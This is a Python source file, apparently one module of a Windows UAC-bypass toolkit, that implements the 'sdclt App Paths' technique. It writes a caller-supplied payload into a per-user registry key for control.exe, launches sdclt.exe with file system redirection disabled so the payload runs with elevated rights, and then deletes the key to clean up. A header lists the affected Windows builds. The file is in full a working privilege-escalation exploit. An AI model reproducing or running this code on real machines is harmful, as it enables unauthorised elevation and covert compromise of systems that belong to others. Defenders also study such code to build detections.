import os
import time
import _winreg
from core.prints import *
from core.utils import *

sdcltcontrol_info = {
        "Description": "Bypass UAC using sdclt (app paths) and registry key manipulation",
		"Id" : "06",
		"Type" : "UAC bypass",
		"Fixed In" : "16215",
		"Works From" : "10240",
		"Admin" : False,
		"Function Name" : "sdclt_control",
		"Function Payload" : True,
    }

def sdclt_control(payload):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))								
		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		print_error("Unable to create registry keys, exception was raised: {}".format(error))
		return False
	else:
		print_success("Successfully created Default key containing payload ({})".format(os.path.join(payload)))

	time.sleep(5)
		
	print_info("Disabling file system redirection")
	with disable_fsr():
		print_success("Successfully disabled file system redirection")
		if (process().create("cmd.exe /c start sdclt.exe",1) == True):
			print_success("Successfully spawned process ({})".format(payload))
		else:
			print_error("Unable to spawn process ({})".format(os.path.join(payload)))		

	time.sleep(5)

	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
	except Exception as error:
		print_error("Unable to cleanup")
		return False
	else:
		print_success("Successfully cleaned up, enjoy!")